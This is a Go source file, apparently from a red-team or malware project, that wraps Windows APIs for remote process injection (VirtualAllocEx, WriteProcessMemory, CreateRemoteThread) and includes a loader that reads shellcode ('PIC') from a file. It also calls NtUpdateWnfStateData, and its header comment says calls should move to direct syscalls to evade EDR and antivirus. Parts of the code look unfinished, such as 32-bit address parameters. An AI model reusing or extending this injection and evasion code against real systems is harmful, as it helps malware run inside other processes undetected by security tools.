/*
Core Windows API calls
update to call by syscalls vs directly to evade edr/av

should we just import / use one of the many libs that have the winapis?
*/


package my_winapi

import (
  "os"
  "bufio"
  "syscall"
  "unsafe"
)

const (
        PAGE_EXECUTE                    = 0x10
        PAGE_EXECUTE_READ               = 0x20
        PAGE_EXECUTE_READWRITE          = 0x40
        PAGE_EXECUTE_WRITECOPY          = 0x80
        PAGE_NOACCESS                   = 0x01
        PAGE_READWRITE                  = 0x04
        PAGE_WRITECOPY                  = 0x08
        PAGE_TARGETS_INVALID            = 0x40000000
        PAGE_TARGETS_NO_UPDATE          = 0x40000000

        MEM_COMMIT                      = 0x00001000
        MEM_RESERVE                     = 0x00002000
        MEM_RESET                       = 0x00080000
        MEM_RESET_UNDO                  = 0x1000000
        MEM_PRIVATE                     = 0x20000
        MEM_LARGE_PAGES                 = 0x20000000
        MEM_PHYSICAL                    = 0x00400000
        MEM_TOP_DOWN                    = 0x00100000

        MEM_DECOMMIT                    = 0x4000
        MEM_RELEASE                     = 0x8000


        PROCESS_ALL_ACCESS              = 0x1F0FFF
        PROCESS_QUERY_INFORMATION       = 0x0400;
        PROCESS_CREATE_THREAD           = 0x0002;
        PROCESS_VM_READ                 = 0x0010;
        PROCESS_VM_WRITE                = 0x0020;
        PROCESS_VM_OPERATION            = 0x0008;
        INVALID_HANDLE                  = ^HANDLE(0)
        PSIZE                           = int(unsafe.Sizeof(int(1)))
)


type MEMORY_BASIC_INFORMATION struct {
        BaseAddress       PVOID
        AllocationBase    PVOID
        AllocationProtect DWORD
        RegionSize        SIZE_T
        State             uint32
        Protect           uint32
        Type              uint32
}

type (
        HANDLE    = uintptr
        HINSTANCE = HANDLE
	HWND      HANDLE
        DWORD     uint32
        ULONG     uint64
        PVOID     unsafe.Pointer
        SIZE_T    uintptr
)
var (
	user32       		 = syscall.NewLazyDLL("user32.dll")
        procFindWindow           = user32.NewProc("FindWindowW")
        procGetThreadPid         = user32.NewProc("GetWindowThreadProcessId")

	kernel32     		 = syscall.NewLazyDLL("kernel32.dll")
        procOpenProcess          = kernel32.NewProc("OpenProcess")
        procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
        procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
        procCreateRemoteThread   = kernel32.NewProc("CreateRemoteThread")
        procGetModuleHandleW     = kernel32.NewProc("GetModuleHandleW")
        procVirtualQuery	 = kernel32.NewProc("VirtualQuery")
	procReadProcessMemory    = kernel32.NewProc("ReadProcessMemory")

	ntdll			 = syscall.NewLazyDLL("ntdll.dll")
	procNtUpdateWnfStateData = ntdll.NewProc("NtUpdateWnfStateData")
)

/*
  _NtUpdateWnfStateData = 
      (NtUpdateWnfStateData_t)GetProcAddress(m, "NtUpdateWnfStateData");
    _NtUpdateWnfStateData(
      &ns, NULL, 0, 0, NULL, 0, 0);

_NtUpdateWnfStateData(&ns, NULL, 0, 0, NULL, 0, 0);

NtUpdateWnfStateData(_NtUpdateWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_reads_bytes_opt_(Length) const VOID* Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const PVOID ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp
    );

*/
/*
        public static void UpdateWnfState()
        {
            UInt64 State = (UInt64)WnfStateNames.WNF_SHEL_LOGON_COMPLETE; // 0xd83063ea3bc1875
            WnfTypeId gTypeId = new WnfTypeId();
            UInt32 CallRes = NtUpdateWnfStateData(ref State, IntPtr.Zero, 0, gTypeId, IntPtr.Zero, 0, false);
        }
    }
*/
func NtUpdateWnfStateData() HWND {
	//var a uintptr
	a := 0xd83063ea3bc1875
	b := &a
        ret, _, _ := procNtUpdateWnfStateData.Call(uintptr(unsafe.Pointer(b)), 0, 0, 0, 0, 0, 0)
        return HWND(ret) // DOESNT  need to be HWND
}

func IsErrSuccess(err error) bool {
        if errno, ok := err.(syscall.Errno); ok {
                if errno == 0 {
                        return true
                }
        }
        return false
}

func VirtualAllocEx(hProcess HANDLE, lpAddress int, dwSize int, flAllocationType int, flProtect int) (addr uintptr, err error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),  // The handle to a process.
		uintptr(lpAddress), // The pointer that specifies a desired starting address for the region of pages that you want to allocate.
		uintptr(dwSize),    // The size of the region of memory to allocate, in bytes.
		uintptr(flAllocationType),
		uintptr(flProtect))
	if int(ret) == 0 {
		return ret, err
	}
	return ret, nil
}

func ReadProcessMemory(hProcess HANDLE, lpBaseAddress uintptr, size uint) (data []byte, err error) { //lpBaseAddress was uint32
	var numBytesRead uintptr
	data = make([]byte, size)
	_, _, err = procReadProcessMemory.Call(uintptr(hProcess),
		uintptr(lpBaseAddress),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if !IsErrSuccess(err) {
		return
	}
	err = nil
	return
}

func WriteProcessMemory(hProcess HANDLE, lpBaseAddress uint32, data []byte, size uint) (err error) {
	var numBytesRead uintptr
	_, _, err = procWriteProcessMemory.Call(uintptr(hProcess),
		uintptr(lpBaseAddress),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if !IsErrSuccess(err) {
		return
	}
	err = nil
	return
}

func CreateRemoteThread(hprocess HANDLE, sa *syscall.SecurityAttributes,
	stackSize uint32, startAddress uint32, parameter uintptr, creationFlags uint32) (HANDLE, uint32, error) {
	var threadId uint32
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(hprocess),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		uintptr(startAddress),
		uintptr(parameter),
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadId)))

	if int(r1) == 0 {
		return INVALID_HANDLE, 0, e1
	}
	return HANDLE(r1), threadId, nil
}

func VirtualQuery(lpAddress uintptr, lpBuffer *MEMORY_BASIC_INFORMATION, dwLength int) int {
	ret, _, _ := procVirtualQuery.Call(
	  lpAddress,
		uintptr(unsafe.Pointer(lpBuffer)),
		uintptr(dwLength))
	return int(ret) // TODO check for errors
}

func ptr(val interface{}) uintptr {
  switch val.(type) {
    case string:
      return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
    case int:
      return uintptr(val.(int))
    default:
      return uintptr(0)
    }
}

func ReadPIC(filename string) ([]byte, error) {
  file, err := os.Open(filename)

  if err != nil {
    return nil, err
  }
  defer file.Close()

  stats, statsErr := file.Stat()
  if statsErr != nil {
    return nil, statsErr
  }

  var size int64 = stats.Size()
  bytes := make([]byte, size)

  bufr := bufio.NewReader(file)
  _,err = bufr.Read(bytes)

  return bytes, err
}
